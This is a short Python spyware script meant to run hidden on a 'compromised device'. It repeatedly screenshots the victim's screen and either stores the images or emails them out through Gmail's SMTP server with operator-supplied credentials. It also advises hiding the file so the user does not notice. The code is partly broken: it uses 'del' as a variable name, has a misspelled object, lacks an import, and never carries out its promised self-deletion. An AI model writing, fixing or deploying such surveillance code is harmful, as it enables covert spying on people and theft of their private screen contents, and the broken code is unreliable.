import time
from os import remove
import pyautogui
import smtplib
from email.message import EmailMessage
pyautogui.FAILSAFE = False
print("This program should be executed on the compromised device.")
print("It is also recommended that you run this in a file that the user will not notice. You can name you file with a '.' in front to hide it or put this somewhere in system files on windows.")
met = input("""
[1]: Taking screenshots and sending it to a directory!
[2]: Email you the screenshots (Screenshots will be saved locally if emails failed to get sent out.)!
""")
del = input("Delete this program after executing? [y/n]: ")
d = input("Delay? :")
c = input("Countdown?: ")
n = input("How many times?: ")
print("Note that the .png extension is already added so it will be image_name.png")
name = input("Directory? (example input: Desktop/image_name): ")
delay = int(d)
count = int(c)
reps = int(n)
shot = int(n)
metter = int(met)
if delay == 0:
    print("Target will experience a lot of lag, especially if you choose to email yourself, run it at 0 delay at our own risk.")
    b = input("Are you sure you wanna do a 0 delay run? [y/n]: ")
    if b == "no" or b == "n":
        exit()
if metter == 2:
    emailto = input("Email address to send to!")
    emailfrom = input("Email address to send from!")
    passwordfrom = input("Password for email to send from!")

fullname = '{}.png'.format(name)
#email part:
def mailer():
    newMessage = EmailMessage()
    newMessage['Subject'] = "Screenshot"
    newMessage['From'] = emailfrom
    newMessage['To'] = emailto
    newMessafe.set_content("Here are the screenshots you requested")

    with open(fullname, 'rb') as f:
        image_data = f.read()
        image_type = imghdr.what(f.name)
        image_name = f.name

    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    
        smtp.login(emailfrom, passwordfrom)              
        smtp.send_message(newMessage)



while (count != 0):
    print(count)
    time.sleep(1)
    count -= 1



#screenshot part
print("""GAWAIN""")
if metter == 1:
    for i in range(0, reps):
        pyautogui.screenshot().save(r'{}{}.png'.format(name, shot))
        time.sleep(delay)
        shot -= 1

if metter == 2:
    for i in range(0, reps):
        pyautogui.screenshot().save(r'{}{}.png'.format(name, shot))
        time.sleep(delay)
        shot -= 1
        mailer()
